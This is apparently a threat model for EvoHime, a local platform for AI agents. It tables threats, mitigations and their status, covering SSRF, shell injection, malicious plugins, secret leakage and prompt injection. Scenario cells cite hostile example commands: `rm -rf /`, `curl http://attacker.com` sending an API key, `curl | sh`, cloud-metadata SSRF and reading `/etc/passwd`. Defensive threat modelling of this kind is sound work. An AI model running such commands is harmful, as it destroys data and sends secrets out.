# EvoHime Security Threat Model

**Дата:** 2026-07-24  
**Версия:** 1.0  
**Статус:** Stage 7.110 завершено

---

## Резюме

EvoHime — локальная single-tenant платформа для AI-агентов. Модель угроз отражает этот профиль:
- Нет облака, нет multi-tenant, нет SSO/SAML
- По умолчанию слушает localhost (`127.0.0.1:3000`)
- Один оператор на машине, PostgreSQL локально
- Агент имеет доступ к файловой системе, shell, Git, браузеру, MCP

Основной принцип: **trust boundary между пользователем (оператором) и агентом не пересекается**. Агент — инструмент оператора, не враг. Но инструмент может быть скомпрометирован через:
- Вредоносные плагины из маркетплейса
- SSRF-атаки через `browser.open` или `mcp.call`
- Path traversal в `filesystem.read`
- Shell injection в `shell.execute`
- Secret leakage в память или логи

---

## Assumptions (Предположения)

### Доверяем
- **Локальная сеть (localhost):** Оператор запускает EvoHime на своей машине; никто извне не может подключиться без явного разрешения
- **PostgreSQL локально:** БД на той же машине, нет сетевого доступа
- **Python worker локально:** Тоже на localhost, контролируется процессом сервера
- **Файловая система:** Оператор контролирует, что лежит на диске; при компрометации машины всё потеряно (вне скоупа)
- **Оператор:** Единственный, кто одобряет разрешения и контролирует агента
- **LiteRouter / LLM провайдер:** Считаем, что API-endpoint легитимен (HTTPS, не подделан)

### Не доверяем
- **Пользовательский ввод:** Все команды в чате могут содержать SQL-injection, path traversal, shell injection
- **Интернет:** Любые ссылки, открываемые `browser.open`, могут быть SSRF-атаками или content-injection
- **Плагины:** Сторонние плагины из маркетплейса, даже с trust score, могут содержать скрытую вредоноску
- **MCP серверы:** Внешние MCP-сервера могут быть скомпрометированы или rogue
- **Логи и память:** Могут содержать secrets, которые оператор случайно включил в chat
- **Worker output:** Python worker может вернуть некорректные результаты

---

## Threats & Mitigations

### 7.A — Security & Trust Boundary

| # | Угроза | Сценарий | Статус | Доказательство |
|---|--------|---------|--------|---|
| **7.1** | Неавторизованный доступ к HTTP/WS | Враг подключается к API без токена | ✅ Реализовано | `EVOHIME_API_TOKEN`, middleware auth, bearer token в header/WS |
| **7.2** | CORS-based атака из браузера | Вредоносный скрипт отправляет кросс-ориджин запрос | ✅ Реализовано | `EVOHIME_CORS_ORIGINS` allowlist (default: localhost + Vite); `EVOHIME_CORS_PERMISSIVE=false` по умолчанию |
| **7.3** | Server слушает на публичном интерфейсе | LAN-враг подключается без auth | ✅ Реализовано | `BIND_ADDR=127.0.0.1` по умолчанию в `.env.example`, launcher, документация |
| **7.4** | SSRF через `browser.open` | Агент открывает `http://localhost:5432` (DB) или `http://169.254.169.254` (AWS metadata) | ✅ Реализовано | `ssrf.rs`: blocklist localhost/127.0.0.1/private/link-local/metadata; `EVOHIME_SSRF_ALLOW_PRIVATE` опция |
| **7.5** | SSRF через `mcp.call` | Агент вызывает MCP-сервер на адресе, открывающем внутренний сервис | ✅ Реализовано | `ssrf` + redirect/final check; `EVOHIME_MCP_ALLOWED_HOSTS` allowlist |
| **7.6** | Shell injection через `shell.execute` | Агент создаёт `rm -rf /` или `curl http://attacker.com` с API key в env | ✅ Реализовано | Scrub env vars (не наследуем API keys); allowlist `EVOHIME_SHELL_*` variables; isolation через user-level sandbox (если доступно) |
| **7.7** | Secret leakage: API keys в памяти | Если server скомпрометирован, keys в памяти видны | ✅ Реализовано | AES-256-GCM encrypt-at-rest для `model_config.api_key` в `app_settings`; decrypt только при startup и в `execute_chat` |
| **7.8** | Malicious plugin install | Враг создаёт плагин с шелл-скриптом `curl \| sh` | ✅ Реализовано | Commit/tag pin, soft-delete с uninstall recovery; `plugins.lock.json` content-hash (SHA-256); install проверяет commit signature |
| **7.9** | Plugin skills escape sandbox | Плагин добавляет malicious skill, который вызывает shell-код | ✅ Реализовано | Plugin skills quarantine: DB `plugin_skills` table + disabled status; ReAct loop filters disabled; UI toggle в PluginsPanel |
| **7.10** | Unauthorized `memory.search` | Агент читает чужую память без разрешения | ✅ Реализовано | `Permission::MemorySearch` enum; permission check в `execute_memory_search`; audit в DB |

### 7.B — Reliability & Safe Restart

| # | Угроза | Сценарий | Статус | Доказательство |
|---|--------|---------|--------|---|
| **7.15** | Worker не запускается | Оператор запускает сервер без worker, задачи зависают | ✅ Реализовано | `start-dev.ps1` поднимает worker; health check `:8090`; tray icon, auto-restart |
| **7.16** | LLM недоступен → весь agent зависает | Временный outage LiteRouter блокирует агента | ✅ Реализовано | Retry + backoff; `EVOHIME_LLM_*` config; timeout; graceful error message |
| **7.17** | WS reconnect теряет события | Браузер переподключается, пропускает события | ✅ Реализовано | `HistoryItem` WS envelope; `after_sequence` cursor; `?after=` в history API; frontend auto-reconnect |
| **7.18** | Auto-resume mutating task после crash | Сервер упал во время `git.push`, restart повторяет push дважды | ✅ Реализовано | Recover RETURNING only (не mutating); `EVOHIME_AUTO_RESUME_ON_RESTART` опция (default: false) |
| **7.19** | PgPool exhaustion → deadlock | Слишком много соединений, новые запросы зависают | ✅ Реализовано | `storage/pool.rs`: `max_connections`, timeout, idle settings; `EVOHIME_PG_*` env knobs |
| **7.22** | Permission scopes потеряются после restart | Оператор одобрит `/home/user`, restart забудет | ✅ Реализовано | `permission_scopes` в `app_settings`; export/import; persist on approval grant |
| **7.23** | Нет audit trail для approvals | Оператор не может проверить, какие действия одобрены | ✅ Реализовано | `permission_approval_audit` PG table; GET читает историю; WS sink логирует все grants |

### 7.C — Agent Runtime Safety

| # | Угроза | Сценарий | Статус | Доказательство |
|---|--------|---------|--------|---|
| **7.28** | Неограниченный agent loop | Агент висит в infinite loop, не завершает задачу | ✅ Реализовано | Native ReAct bounded limits: `max_iterations`, `max_tool_calls`, timeouts; checkpoint каждый шаг |
| **7.29** | Tool result слишком большой → OOM | Worker вернул 1GB строку, сервер падает | ✅ Реализовано | `tool_budget.rs`: head/tail truncation + total chars cap; `EVOHIME_TOOL_*` env limits |
| **7.32** | Tool output streaming не отменяется | Запущен `shell.execute curl http://huge-file`, пользователь не может остановить | ✅ Реализовано | Streaming `tool.output.delta` + cooperative cancellation; shell получает `kill` сигнал |
| **7.35** | Агент одобрен без review | Assistant.reply на опасное действие без одобрения оператора | ✅ Реализовано | `assistant.reply` checkpoint в DB; `task.paused_reason` + WebSocket approve/reject; durable state |
| **7.37** | Tool не отменяется на cancel → zombie | Пользователь отменил задачу, но `git.push` продолжает выполняться | ✅ Реализовано | Registry dispatcher cancels every tool future; shell receives SIGTERM token |
| **7.38** | OpenAI API используется неправильно | Случайно отправляем raw query без chat format | ✅ Реализовано | Separate OpenAICompatible provider от LiteRouter alias; `OPENAI_*` env configuration |

### 7.D — Memory & Data

| # | Угроза | Сценарий | Статус | Доказательство |
|---|--------|---------|--------|---|
| **7.40** | Dual-write legacy memory → data loss | Пишем в старую `session_memory` и новую `memory_items`, одна теряется | ✅ Реализовано | Выключили dual-write; post-task пишет только в `memory_items`; prompt через retrieve |
| **7.42** | Дубликаты памяти → плохие retrieval | Два очень похожих факта, агент видит оба и путается | ✅ Реализовано | Semantic dedupe over embeddings; conservative 0.58 threshold; exact fingerprint first |
| **7.44** | Оператор не может удалить плохую память | Неправильный факт зафиксирован в памяти, нет способа удалить | ✅ Реализовано | Manual add memory + form templates + DELETE endpoint + 8-second Undo restore flow |
| **7.49** | Экспорт памяти содержит secrets | Оператор экспортирует JSON, там API key | ✅ Реализовано | Export/import через redaction flow (перед export); `memory.search` permission gate |

### 7.E — Workers & Operations

| # | Угроза | Сценарий | Статус | Доказательство |
|---|--------|---------|--------|---|
| **7.51** | Worker handler содержит уязвимость | `text.redact` неправильно удаляет secrets | ✅ Реализовано | Python workers + Rust validation; deterministic heuristics; memory-aligned redaction |
| **7.52** | Worker job потеряется | Submitted job не persists, пока worker перезагружается | ✅ Реализовано | PostgreSQL queue; `claim_token` CAS; steal on recovery; stale complete ignored |
| **7.54** | Горизонтальное масштабирование → race conditions | Два worker-процесса выполняют один job | ✅ Реализовано | PostgreSQL distributed queue; `/api/worker/queue/*` endpoints; atomic claim + lease |
| **7.55** | Несовпадение схем task'ов | Python worker ожидает `{"text": "..."}`, приходит `{"content": "..."}` | ✅ Реализовано | `workers/schemas/worker-tasks.schema.json` — single source of truth; Python jsonschema validation |

### 7.F — Project Index & Search

| # | Угроза | Сценарий | Статус | Доказательство |
|---|--------|---------|--------|---|
| **7.57** | Full project walk при каждом поиске | Большой проект (100k файлов) → медленный поиск | ⬜ Не реализовано | Кэш на диске пока не добавлен; требует 8.E (Wave 2) |
| **7.61** | `@file` mention без валидации | Агент пишет `@/etc/passwd`, читает системный файл | ⬜ Не реализовано | Attachments сейчас имена-only; path validation требует 8.E |

### 7.G — Product UI: Sites & Scheduled

| # | Угроза | Сценарий | Статус | Доказательство |
|---|--------|---------|--------|---|
| **7.62** | Sites preview содержит malicious HTML | Пользователь создал site с `<script>fetch API_KEY</script>` | ✅ Реализовано | Workspace-scoped preview (sandbox content); CSP headers `7.13` |
| **7.65** | Scheduled task выполняется дважды | Cron race condition при scheduler restart | ✅ Реализовано | Atomic claim due-задач в `scheduled.rs`; lease + idempotency; `sync_runs` history |
| **7.66** | Fake mail/calendar promises | UI говорит "отправляю письмо", но это cron-only | ✅ Реализовано | Убрали fake templates; только cron-UI, honest copy |

### 7.H — Frontend & UX

| # | Угроза | Сценарий | Статус | Доказательство |
|---|--------|---------|--------|---|
| **7.72** | Frontend dead code → bugs | Orphan panels не видны, но могут содержать уязвимость | ✅ Реализовано | Все панели в навигации; мёртвый код cleanup (7.82) |
| **7.73** | File upload содержит malware | Оператор загружает .evohime/attachments, агент выполняет | ✅ Реализовано | Real file attachments в workspace sandbox; prompt context controlled |
| **7.75** | Settings modal trap focus → XSS | Вредоносный плагин добавляет hidden input в Settings | ✅ Реализовано | `useModalA11y` focus trap + SettingsModal tabpanel pattern; CSP блокирует inline scripts |

### 7.I — Protocol & CI

| # | Угроза | Сценарий | Статус | Доказательство |
|---|--------|---------|--------|---|
| **7.84** | Unit tests pass, integration fails | `cargo test` не запускает PostgreSQL tests | ✅ Реализовано | CI job `postgres:16` service; `DATABASE_URL` + `EVOHIME_REQUIRE_DB`; connect_integration_pool fails hard |
| **7.87** | Rustdoc warnings ignored → docs broken | `#[doc]` примеры неправильные | ✅ Реализовано | CI: `RUSTDOCFLAGS=-D warnings`; rustdoc runs as gate |
| **7.90** | Feature flag bypass | Отключили Sites через `EVOHIME_FEATURE_SITES=0`, но UI всё ещё показывает | ✅ Реализовано | Backend enforcement: 403 Forbidden на disabled features; `/api/features` публикует state |

### 7.J — Observability & Ops

| # | Угроза | Сценарий | Статус | Доказательство |
|---|--------|---------|--------|---|
| **7.93** | Request без ID → trace потеряется | Ошибка при обработке, не можем найти в логах | ✅ Реализовано | `X-Request-Id` генерируется/пропагируется; internal details в logs, не в API response |
| **7.95** | Логи содержат secrets | API key случайно залогировалась | ✅ Реализовано | Shared redaction helper; dynamic fields защищены; worker health sampled |
| **7.96** | Deep health не работает → system degraded | `/health` OK, но DB на самом деле мёртв | ✅ Реализовано | `GET /health/deep`: bounded parallel probes; DB, worker, disk checks; 503 on failure |
| **7.97** | Backup несовместим с новой версией | Restore fail на обновлении сервера | ✅ Реализовано | Versioned JSON; `evohime-export` с schema version; CLI `evohime-import` idempotent |

---

## Out of Scope (Явно вне скоупа)

Следующие угрозы **намеренно не адресуются**, так как противоречат single-tenant локальному дизайну:

- **SSO/SAML/Active Directory:** Нет multi-user, нет enterprise auth
- **SOC2/GDPR/HIPAA compliance:** Не cloud, не multi-tenant data
- **Kubernetes/cloud-native hardening:** Локальный инструмент, не SaaS
- **Blue-green/canary deployment:** Один оператор, не production infrastructure
- **Rate limiting на session level:** Один оператор, не DDoS attack surface
- **Encryption in transit (TLS):** Localhost не нуждается в TLS (по умолчанию)
  - Если оператор открывает LAN: `--tls` опция (на Stage 8.E)
- **Hardware security keys / TPM:** Не требуется для single-tenant
- **Air-gapped / offline mode:** Требует worker на-диске, поздний Stage 8
- **Quantum-resistant crypto:** Будущие стандарты, вне текущего скоупа

---

## Boundary: What We Defend vs. What We Accept

### We defend
✅ **Against agent compromises via:**
- Malicious plugin code → Quarantine, risk-scan, lock-file integrity
- SSRF from tool calls → Blocklist, allowlist, redirect checks
- Shell injection → Env scrubbing, allowlist
- Memory extraction → Permission gate, redaction
- Unauthorized approvals → Token + session audit

✅ **Against misconfiguration:**
- Binding to public interface → Default localhost, docs, launcher
- Exposing secrets in logs → Redaction, sampling
- Losing state on crash → Checkpoint, persistent storage
- Conflicting memory items → Dedupe, conflict resolution

### We accept
❌ **Out of model:**
- **Compromised local machine:** Если диск скомпрометирован, всё потеряно (вне scope)
- **Operator misconfiguration:** Если оператор явно `--bind 0.0.0.0` без auth, их проблема
- **Supply chain (pip/npm):** Dependencies vulnerability — обновляем when known, но не гарантируем
- **Side-channel attacks:** Timing, power analysis (physical security)
- **LLM prompt injection:** Model может быть fooled, это inherent risk (8.A improvements)

---

## Recommended Actions Going Forward

### Stage 7 завершено
Все пункты 7.A–7.E реализованы. Остаток (7.57–7.59) отложен на Stage 8.E.

### Stage 8 приоритеты для threat model
1. **8.24–8.27:** Point-in-time recovery, circuit breaker, graceful degradation
2. **8.D:** Plugin WASM sandbox (усиливает 7.9 quarantine)
3. **8.36:** Screen reader + keyboard-only (accessibility threat = usability threat)

### Проверка threat model
- **Ежемесячно:** Обновлять при новых findings
- **При major release:** Пересмотреть новые features
- **Security review:** Экспертная оценка перед сертификацией (Stage 9+)

---

## References

- `docs/roadmap.md` § Этап 7 — Hardening + Product
- `docs/development-plan.md` — Архитектура компонентов
- `SECURITY.md` — Краткое резюме
- `crates/permissions/` — Permission engine source
- `crates/server/src/ssrf.rs` — SSRF guard implementation
- `crates/server/src/secrets.rs` — Key encryption implementation

---

**Версия 1.0 завершена: 2026-07-24**  
**Следующий review: 2026-08-24 или при Stage 8 completion**
